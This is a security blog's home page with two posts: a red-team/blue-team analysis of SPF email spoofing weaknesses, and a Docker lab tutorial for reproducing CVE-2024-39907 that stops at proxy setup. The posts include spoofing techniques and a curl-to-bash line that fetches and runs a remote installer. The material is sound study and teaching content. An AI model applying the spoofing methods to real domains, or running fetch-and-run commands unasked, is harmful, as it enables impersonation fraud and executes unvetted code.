<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
<meta property="og:type" content="website">
<meta property="og:title" content="congdong007">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="congdong007">
<meta property="og:description" content="bW9ua2V5Y2RAZ21haWwuY29t">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Dong Cong">
<meta property="article:tag" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash、Penetration Tester">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>congdong007</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="congdong007" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">congdong007</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Penetration Test、Software Developer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa  fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/congdong007" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/15/Deep-Dive-SPF-from-an-Offensive%E2%80%93Defensive-Perspective/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/15/Deep-Dive-SPF-from-an-Offensive%E2%80%93Defensive-Perspective/" class="post-title-link" itemprop="url">Deep Dive SPF from an Offensive–Defensive Perspective</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2026-02-15 11:20:21 / Modified: 11:50:08" itemprop="dateCreated datePublished" datetime="2026-02-15T11:20:21-05:00">2026-02-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerable-research/" itemprop="url" rel="index"><span itemprop="name">Vulnerable research</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerable-research/SPF-vulnerability/" itemprop="url" rel="index"><span itemprop="name">SPF vulnerability</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>We will analyze SPF strictly from a <strong>red team &#x2F; adversarial security</strong> standpoint, focusing on real exploitation logic and defensive blind spots.</p>
<hr>
<h1 id="1-Threat-Modeling"><a href="#1-Threat-Modeling" class="headerlink" title="1. Threat Modeling"></a>1. Threat Modeling</h1><p>Within the email security pipeline:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SMTP connection</span><br><span class="line">   ↓</span><br><span class="line">SPF validation (IP ↔ envelope-from)</span><br><span class="line">   ↓</span><br><span class="line">DKIM validation (signature)</span><br><span class="line">   ↓</span><br><span class="line">DMARC alignment check</span><br><span class="line">   ↓</span><br><span class="line">Spam / SOC filtering rules</span><br></pre></td></tr></table></figure>

<p>SPF is the <strong>first-layer weak binding validation mechanism</strong>. Its core question is:</p>
<blockquote>
<p>“Is this IP authorized to send mail on behalf of this envelope domain?”</p>
</blockquote>
<p>SPF is not an identity authentication system.<br> It is a <strong>source authorization declaration system</strong>.</p>
<hr>
<h1 id="2-Common-Red-Team-Exploitation-Paths"><a href="#2-Common-Red-Team-Exploitation-Paths" class="headerlink" title="2. Common Red Team Exploitation Paths"></a>2. Common Red Team Exploitation Paths</h1><h2 id="1️⃣-Header-From-Spoofing-SPF-Design-Limitation"><a href="#1️⃣-Header-From-Spoofing-SPF-Design-Limitation" class="headerlink" title="1️⃣ Header-From Spoofing (SPF Design Limitation)"></a>1️⃣ Header-From Spoofing (SPF Design Limitation)</h2><p>SPF validates only:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM:</span><br></pre></td></tr></table></figure>

<p>But users see:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">From:</span><br></pre></td></tr></table></figure>

<p>If the target domain:</p>
<ul>
<li>Has SPF configured</li>
<li>But does NOT enforce or strictly configure DMARC</li>
</ul>
<p>You can construct:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM: attacker@legit-spf-domain.com</span><br><span class="line">From: ceo@target.com</span><br></pre></td></tr></table></figure>

<p>As long as the first domain passes SPF,<br> the receiving server may accept the email,<br> while the visible sender appears as target.com.</p>
<p>⚠ This is the most common real-world CEO spoofing model.</p>
<hr>
<h2 id="2️⃣-Triggering-PermError-via-the-10-DNS-Lookup-Limit"><a href="#2️⃣-Triggering-PermError-via-the-10-DNS-Lookup-Limit" class="headerlink" title="2️⃣ Triggering PermError via the 10 DNS Lookup Limit"></a>2️⃣ Triggering PermError via the 10 DNS Lookup Limit</h2><p>SPF RFC enforces:</p>
<blockquote>
<p>Maximum of 10 DNS lookups.</p>
</blockquote>
<p>Red team strategy:</p>
<ol>
<li>Recursively expand include chains.</li>
<li>Identify domains close to the 10-lookup threshold.</li>
<li>Exploit DNS delays or timeouts.</li>
<li>Trigger SPF PermError.</li>
</ol>
<p>The issue:</p>
<ul>
<li>Some gateways treat PermError as Neutral.</li>
<li>Neutral often does not trigger rejection.</li>
</ul>
<p>This is essentially a <strong>policy downgrade attack</strong>.</p>
<hr>
<h2 id="3️⃣-Abuse-of-SoftFail-all"><a href="#3️⃣-Abuse-of-SoftFail-all" class="headerlink" title="3️⃣ Abuse of SoftFail (~all)"></a>3️⃣ Abuse of SoftFail (~all)</h2><p>If a domain uses:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v=spf1 include:xxx ~all</span><br></pre></td></tr></table></figure>

<p>Red team actions:</p>
<ul>
<li>Directly spoof the domain.</li>
<li>Many servers will not hard reject.</li>
<li>Combine with social engineering for high success rates.</li>
</ul>
<p>Common enterprise misconception:</p>
<blockquote>
<p>“We have SPF, therefore we are protected.”</p>
</blockquote>
<p>But <code>~all</code> is merely advisory.</p>
<hr>
<h2 id="4️⃣-Third-Party-Include-Supply-Chain-Risk"><a href="#4️⃣-Third-Party-Include-Supply-Chain-Risk" class="headerlink" title="4️⃣ Third-Party Include Supply Chain Risk"></a>4️⃣ Third-Party Include Supply Chain Risk</h2><p>Typical enterprise SPF:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include:_spf.google.com</span><br><span class="line">include:spf.protection.outlook.com</span><br><span class="line">include:mailgun.org</span><br><span class="line">include:zendesk.com</span><br></pre></td></tr></table></figure>

<p>Risk factors:</p>
<ul>
<li>Third-party service abuse</li>
<li>Poor account isolation</li>
<li>API key leakage</li>
<li>Overly broad vendor SPF policies</li>
</ul>
<p>Attack path:</p>
<ul>
<li>Obtain legitimate sending API access.</li>
<li>Send mail from authorized infrastructure.</li>
<li>SPF Pass + DKIM Pass.</li>
<li>If DMARC policy &#x3D; none → delivery succeeds.</li>
</ul>
<p>This is one of the most dangerous real-world paths.</p>
<hr>
<h2 id="5️⃣-Subdomain-Coverage-Gaps"><a href="#5️⃣-Subdomain-Coverage-Gaps" class="headerlink" title="5️⃣ Subdomain Coverage Gaps"></a>5️⃣ Subdomain Coverage Gaps</h2><p>Many enterprises configure:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com</span><br></pre></td></tr></table></figure>

<p>But ignore:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finance.example.com</span><br><span class="line">secure.example.com</span><br></pre></td></tr></table></figure>

<p>If subdomains lack SPF and DMARC:</p>
<p>You can spoof:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceo@finance.example.com</span><br></pre></td></tr></table></figure>

<p>Visual deception success rate is extremely high.</p>
<hr>
<h2 id="6️⃣-Forwarding-Chain-Confusion"><a href="#6️⃣-Forwarding-Chain-Confusion" class="headerlink" title="6️⃣ Forwarding Chain Confusion"></a>6️⃣ Forwarding Chain Confusion</h2><p>SPF does not support forwarding.</p>
<p>Attack model:</p>
<ul>
<li>Use legitimate relays.</li>
<li>Or leverage open forwarding systems.</li>
<li>Trigger SPF Fail → system falls back to DKIM.</li>
<li>If DKIM alignment is not strict → bypass possible.</li>
</ul>
<p>This is an <strong>authentication chain fragmentation attack</strong>.</p>
<hr>
<h2 id="7️⃣-DMARC-Alignment-Abuse"><a href="#7️⃣-DMARC-Alignment-Abuse" class="headerlink" title="7️⃣ DMARC Alignment Abuse"></a>7️⃣ DMARC Alignment Abuse</h2><p>DMARC supports two alignment modes:</p>
<ul>
<li>relaxed</li>
<li>strict</li>
</ul>
<p>If relaxed alignment is used:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mail.example.com</span><br><span class="line">news.example.com</span><br></pre></td></tr></table></figure>

<p>You may craft malicious subdomains<br> that still satisfy relaxed alignment.</p>
<hr>
<h1 id="3-Blue-Team-Defensive-Maturity-Levels"><a href="#3-Blue-Team-Defensive-Maturity-Levels" class="headerlink" title="3. Blue Team Defensive Maturity Levels"></a>3. Blue Team Defensive Maturity Levels</h1><h3 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h3><ul>
<li>No SPF</li>
<li>No DKIM</li>
<li>No DMARC</li>
</ul>
<p>Fully spoofable.</p>
<hr>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><ul>
<li>SPF with ~all</li>
<li>No DMARC</li>
</ul>
<p>Highly vulnerable to CEO spoofing.</p>
<hr>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><ul>
<li>SPF -all</li>
<li>DKIM enabled</li>
<li>DMARC policy&#x3D;none</li>
</ul>
<p>Still exploitable via alignment weaknesses.</p>
<hr>
<h3 id="Level-3-Enterprise-Recommended"><a href="#Level-3-Enterprise-Recommended" class="headerlink" title="Level 3 (Enterprise Recommended)"></a>Level 3 (Enterprise Recommended)</h3><ul>
<li>SPF -all</li>
<li>Mandatory DKIM signing</li>
<li>DMARC policy&#x3D;quarantine or reject</li>
<li>Strict alignment</li>
<li>Subdomain coverage</li>
</ul>
<hr>
<h1 id="4-Red-Team-Assessment-Methodology"><a href="#4-Red-Team-Assessment-Methodology" class="headerlink" title="4. Red Team Assessment Methodology"></a>4. Red Team Assessment Methodology</h1><h2 id="Step-1-—-DNS-Enumeration"><a href="#Step-1-—-DNS-Enumeration" class="headerlink" title="Step 1 — DNS Enumeration"></a>Step 1 — DNS Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig txt target.com</span><br><span class="line">dig txt _dmarc.target.com</span><br></pre></td></tr></table></figure>

<p>Collect:</p>
<ul>
<li>SPF structure</li>
<li>include count</li>
<li>Presence of ~all</li>
<li>DMARC policy</li>
</ul>
<hr>
<h2 id="Step-2-—-Include-Expansion"><a href="#Step-2-—-Include-Expansion" class="headerlink" title="Step 2 — Include Expansion"></a>Step 2 — Include Expansion</h2><p>Recursively measure:</p>
<ul>
<li>Total DNS lookup count</li>
<li>Proximity to 10-query limit</li>
<li>Third-party dependencies</li>
</ul>
<hr>
<h2 id="Step-3-—-Subdomain-Enumeration"><a href="#Step-3-—-Subdomain-Enumeration" class="headerlink" title="Step 3 — Subdomain Enumeration"></a>Step 3 — Subdomain Enumeration</h2><p>Identify:</p>
<ul>
<li>Subdomains without SPF</li>
<li>Subdomains without DMARC</li>
<li>Relaxed alignment usage</li>
</ul>
<hr>
<h2 id="Step-4-—-Controlled-Delivery-Testing"><a href="#Step-4-—-Controlled-Delivery-Testing" class="headerlink" title="Step 4 — Controlled Delivery Testing"></a>Step 4 — Controlled Delivery Testing</h2><p>Testing matrix:</p>
<table>
<thead>
<tr>
<th>Test Case</th>
<th>Objective</th>
</tr>
</thead>
<tbody><tr>
<td>SPF Pass + DMARC None</td>
<td>Delivery acceptance</td>
</tr>
<tr>
<td>SPF SoftFail</td>
<td>Rejection behavior</td>
</tr>
<tr>
<td>Header-From spoof</td>
<td>Inbox placement</td>
</tr>
<tr>
<td>Subdomain spoof</td>
<td>DMARC enforcement</td>
</tr>
</tbody></table>
<hr>
<h1 id="5-Real-World-Conditions-for-Successful-Attacks"><a href="#5-Real-World-Conditions-for-Successful-Attacks" class="headerlink" title="5. Real-World Conditions for Successful Attacks"></a>5. Real-World Conditions for Successful Attacks</h1><p>Attacks commonly succeed when:</p>
<ul>
<li>DMARC policy &#x3D; none</li>
<li>SPF uses ~all</li>
<li>Relaxed alignment</li>
<li>Weak inbound filtering</li>
<li>SOC does not monitor DMARC reports</li>
</ul>
<hr>
<h1 id="6-Core-Insight"><a href="#6-Core-Insight" class="headerlink" title="6. Core Insight"></a>6. Core Insight</h1><p>SPF itself is not a vulnerability.<br> It is a <strong>weak trust declaration protocol</strong>.</p>
<p>Real risk arises from:</p>
<ul>
<li>Misconfiguration</li>
<li>Over-reliance on SPF alone</li>
<li>Lack of DMARC enforcement</li>
<li>Third-party supply chain exposure</li>
</ul>
<hr>
<h1 id="7-Advanced-Perspective"><a href="#7-Advanced-Perspective" class="headerlink" title="7. Advanced Perspective"></a>7. Advanced Perspective</h1><p>At a higher architectural level:</p>
<ul>
<li>SPF is the <strong>control plane</strong></li>
<li>DKIM is the <strong>data plane</strong></li>
<li>DMARC is the <strong>policy plane</strong></li>
</ul>
<p>Attacks often occur in the gaps:</p>
<blockquote>
<p>Authentication inconsistency exploitation</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/04/CVE-2024-39907/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/12/04/CVE-2024-39907/" class="post-title-link" itemprop="url">From scratch, a hands-on, step-by-step guide to setting up Docker and reproducing the CVE-2024-39907 vulnerability.</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-12-04 22:03:51" itemprop="dateCreated datePublished" datetime="2025-12-04T22:03:51-05:00">2025-12-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-12-05 21:22:44" itemprop="dateModified" datetime="2025-12-05T21:22:44-05:00">2025-12-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerable-research/" itemprop="url" rel="index"><span itemprop="name">Vulnerable research</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerable-research/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p> For beginners, improving penetration testing skills while keeping up with the rapid development of security technologies is a challenge faced by everyone in the industry. Learning how to build your own vulnerable lab environment from scratch using Docker is essential. In this article, using CVE-2024-39907 as an example, we provide a step-by-step guide to help newcomers build their own vulnerability reproduction environment.</p>
<h2 id="Vulnerability-Overview"><a href="#Vulnerability-Overview" class="headerlink" title="Vulnerability Overview"></a>Vulnerability Overview</h2><p> 1Panel is a web-based Linux server management control panel that provides a graphical interface for server administration. CVE-2024-39907 refers to a collection of SQL injection vulnerabilities found in multiple interfaces of the 1Panel control panel. Due to insufficient filtering at several injection points, attackers could achieve arbitrary file write, ultimately leading to remote code execution (RCE).The vulnerability affects 1Panel version v1.10.9-lts and earlier, and has been patched in version v1.10.12-lts.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><p>​    <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml</a><br>​    <a target="_blank" rel="noopener" href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6</a><br>​    <a target="_blank" rel="noopener" href="https://hub.docker.com/r/moelin/1panel">https://hub.docker.com/r/moelin/1panel</a></p>
<h1 id="Environment-Information"><a href="#Environment-Information" class="headerlink" title="Environment Information"></a>Environment Information</h1><table>
<thead>
<tr>
<th>Type</th>
<th>Version</th>
</tr>
</thead>
<tbody><tr>
<td>Operating System</td>
<td>Kali Linux</td>
</tr>
<tr>
<td>Docker</td>
<td>version 24.0.2</td>
</tr>
<tr>
<td>Docker Compose</td>
<td>Version v2.18.1</td>
</tr>
<tr>
<td>Yakit</td>
<td>1.4.4-beta15</td>
</tr>
</tbody></table>
<h2 id="Preliminary-Preparation-Installing-Docker"><a href="#Preliminary-Preparation-Installing-Docker" class="headerlink" title="Preliminary Preparation (Installing Docker)"></a>Preliminary Preparation (Installing Docker)</h2><h3 id="Install-Docker"><a href="#Install-Docker" class="headerlink" title="Install Docker"></a>Install Docker</h3><p>​     First, switch to the root user and check whether Docker is already installed on the system. If you see a message like the one below, it means Docker is not installed:</p>
<p><img src="/images/docker01.png"></p>
<p>Next, install Docker. Save the following code as docker_install.sh and run it.</p>
<p><img src="/images/docker02.png"><br>  After the installation completed, you will see a message like the one below , indicating that the Docker has been successful installed.</p>
<p><img src="/images/docker03.png"></p>
<h3 id="Setting-up-a-Docker-testing-environment"><a href="#Setting-up-a-Docker-testing-environment" class="headerlink" title="Setting up a Docker testing environment"></a>Setting up a Docker testing environment</h3><p>To build your own vulnerability testing environment with Docker, you first need to obtain the YAML file used by docker compose. In this case , we are using the Docker environments provided by th open-source platform vulhub.org in China.You can download them using the following command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
<p>After the download is completed, switch to &#x2F;vulhub&#x2F;1panel&#x2F;CVE-2024-39907 with root privileges , and run the following command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>You will see a similar prompt window. Please wait patiently until process complete.</p>
<p><img src="/images/docker04.png"></p>
<p>At this point,the Docker envrionment container have been downloaded locally. You can now use the command to view the currently running containers.</p>
<p><img src="/images/docker05.png"></p>
<p>The output is shown below.</p>
<p><img src="/images/docker06.png"></p>
<p>At this point, we need remember the value in the NAMES column,as it will be used when we operate this Docker container .In addition, remember that the port is 10086. I recommend openning another terminal with root privileges to monitor the container’s log output in real<br>time,which will help us track its current running status.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f cve-2024-39907-1panel-1</span><br></pre></td></tr></table></figure>

<p>At this point,we have started tracking the container logs.</p>
<p><img src="/images/docker07.png"></p>
<p>Next,we can use the following command to enter the Docker container environment to inspect specific files ,because sometimes you may need create databases ,tables and other related information:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it cve-2024-39907-1panel-1 bash</span><br></pre></td></tr></table></figure>

<p>At this point,note the change in the command prompt :</p>
<p><img src="/images/docker08.png"></p>
<p>It has changed from “root@ubuntu1804:&#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;1panel&#x2F;CVE-2024-39907#” into “root@4847e2dc4245:&#x2F;#”.Now ,open the firefox browser and enter the following in the address bar:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:10086/entrance</span><br></pre></td></tr></table></figure>

<p>At this point, the page should be open:</p>
<p><img src="/images/docker09.png"></p>
<p>Where we can find the username and password? Don’t worry,in the YAML directory, there is a file named readme.md, which provided information about these items:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">port:10086</span><br><span class="line">username：1panel</span><br><span class="line">password：1panel_password</span><br><span class="line">related path ：entrance</span><br></pre></td></tr></table></figure>

<p>Enter the username and password, check the agreement option, you will be able to acess the following interface:</p>
<p><img src="/images/docker10.png"></p>
<p>At this point,the Docker container for the vulnerability has been successful set up.Next comes the exciting part-conducting the penetration test.In addition,a few more notes:sometimes you need to copy files form Docker container to the host machine , such as set up a database,how can this be done? Docker provides the cp command,which allows files copying between the container and the host machine, and it also works the other way around.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> &lt;CONTAINER NAMES&gt;:/var/www/html/install/discuz.sql /home/ubuntu/Desktop/</span><br></pre></td></tr></table></figure>

<p>This command copies a file from the container to the host machine,and it also works the other way arround. One thing to remember: this command must be executed in host machine’s command line.Can we start penetration test now? Not yet - We still need to install Yakit or BurpSuite.</p>
<h2 id="Install-Yakit"><a href="#Install-Yakit" class="headerlink" title="Install Yakit"></a>Install Yakit</h2><p>Considering that the BurpSuite version on Kali is quite outdated,and Yakit tends to be more convenient to use , you can dicide for yourself whether you want to install Yakit.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sS -L http://oss-qn.yaklang.com/install-latest-yak.sh)</span><br></pre></td></tr></table></figure>

<p>After the installation is completed, you will see information similar to the following:</p>
<p><img src="/images/Yakit01.png"></p>
<p>This indicated that Yakit has installed . Run the yak command  to check the version and confirm that the installation was successful.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yak version</span><br></pre></td></tr></table></figure>

<p>If the screen looks like the image below, it means Yakit has been successful installed.</p>
<p><img src="/images/Yakit02.png"></p>
<p>Next,grant executable permissions to Yakit-1.4.5-1128-linux-amd64.AppImage:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x Yakit-1.4.5-1128-linux-amd64.AppImage</span><br></pre></td></tr></table></figure>

<p>At this point,switch to the kali user,and you can run Yakit:</p>
<p><img src="/images/Yakit03.png"></p>
<h3 id="Configure-Yakit’s-proxy"><a href="#Configure-Yakit’s-proxy" class="headerlink" title="Configure Yakit’s proxy"></a>Configure Yakit’s proxy</h3><p>The default proxy settings in Yakit are : ip : 127.0.0.1 port:8083.I have installed foxyproxy in firefox,and configured it as shown below:</p>
<p><img src="/images/Yakit04.png"></p>
